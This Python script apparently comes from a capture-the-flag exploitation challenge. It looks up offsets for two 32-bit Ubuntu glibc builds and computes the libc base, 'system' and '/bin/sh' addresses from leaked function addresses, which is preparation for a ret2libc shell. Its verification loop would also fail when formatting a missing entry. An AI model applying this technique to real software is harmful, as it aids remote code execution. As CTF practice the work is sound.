import requests
import json

libs = [
    "libc6-i386_2.31-0ubuntu9.17_amd64",
    "libc6-i386_2.31-0ubuntu9.18_amd64",
]

for lib_id in libs:
    print(f"\n{'='*70}")
    print(f"Fetching full info for: {lib_id}")
    print(f"{'='*70}")
    
    try:
        resp = requests.post("https://libc.rip/api/find", json={"id": lib_id}, timeout=15)
        if resp.status_code == 200:
            results = resp.json()
            if results:
                result = results[0]
                symbols = result.get('symbols', {})
                
                key_syms = ['system', 'str_bin_sh', 'execve', '__libc_start_main',
                            'puts', 'printf', 'write', 'read', 'setvbuf', 'memset',
                            'open', 'read', 'mprotect', 'mmap', 'dup2', 'socket']
                
                print(f"  ID: {result.get('id', 'N/A')}")
                print(f"  Build ID: {result.get('buildid', 'N/A')}")
                print(f"  URL: {result.get('url', 'N/A')}")
                print(f"\n  Key symbol offsets:")
                
                for sym in key_syms:
                    if sym in symbols:
                        print(f"    {sym:25s} = {symbols[sym]}")
                
                download_url = result.get('url', '')
                if download_url:
                    print(f"\n  Download URL: {download_url}")
            else:
                print("  No results")
        else:
            print(f"  Status: {resp.status_code}")
    except Exception as e:
        print(f"  Error: {e}")

print(f"\n{'='*70}")
print("VERIFICATION: Checking offset differences against leaked addresses")
print(f"{'='*70}")

leaked = {
    'read': 0xf7e74790,
    'printf': 0xf7dd3d30,
    'puts': 0xf7df11e0,
    '__libc_start_main': 0xf7d9ede0,
    'write': 0xf7e74830,
    'setvbuf': 0xf7df19c0,
    'memset': 0xf7ecf3b0,
}

puts_offset = 0x6d1e0
libc_base = leaked['puts'] - puts_offset
print(f"\n  libc_base = puts_leaked - puts_offset = 0x{leaked['puts']:x} - 0x{puts_offset:x} = 0x{libc_base:x}")

offsets = {
    'system': 0x41360,
    'str_bin_sh': 0x18c363,
    'puts': 0x6d1e0,
    'printf': 0x4fd30,
}

print(f"\n  Calculated addresses (for this session, ASLR changes each time):")
for name, offset in offsets.items():
    addr = libc_base + offset
    print(f"    {name:20s} = libc_base + 0x{offset:x} = 0x{addr:x}")

print(f"\n  Verification - checking offset differences:")
for name, offset in offsets.items():
    if name != 'puts':
        expected_diff = offset - puts_offset
        actual_diff = leaked.get(name, 0) - leaked['puts'] if name in leaked else 'N/A'
        match = "OK" if expected_diff == actual_diff else "MISMATCH!"
        print(f"    {name} - puts: expected=0x{expected_diff:x}, actual=0x{actual_diff:x} [{match}]")

write_offset = puts_offset + (leaked['write'] - leaked['puts'])
read_offset = puts_offset + (leaked['read'] - leaked['puts'])
lsm_offset = puts_offset + (leaked['__libc_start_main'] - leaked['puts'])
setvbuf_offset = puts_offset + (leaked['setvbuf'] - leaked['puts'])
memset_offset = puts_offset + (leaked['memset'] - leaked['puts'])

print(f"\n  Derived offsets (from leaked differences):")
print(f"    write:             0x{write_offset:x}")
print(f"    read:              0x{read_offset:x}")
print(f"    __libc_start_main: 0x{lsm_offset:x}")
print(f"    setvbuf:           0x{setvbuf_offset:x}")
print(f"    memset:            0x{memset_offset:x}")

info = {
    'libc_id': 'libc6-i386_2.31-0ubuntu9.17_amd64 or libc6-i386_2.31-0ubuntu9.18_amd64',
    'glibc_version': '2.31',
    'distro': 'Ubuntu 20.04 (focal)',
    'arch': 'i386 (32-bit)',
    'confirmed_offsets': {
        'system': hex(0x41360),
        'str_bin_sh': hex(0x18c363),
        'puts': hex(0x6d1e0),
        'printf': hex(0x4fd30),
        'write': hex(write_offset),
        'read': hex(read_offset),
        '__libc_start_main': hex(lsm_offset),
        'setvbuf': hex(setvbuf_offset),
        'memset': hex(memset_offset),
    }
}

with open('d:/iscc/pwn2/libc_info.json', 'w') as f:
    json.dump(info, f, indent=2)

print(f"\n  Saved to libc_info.json")
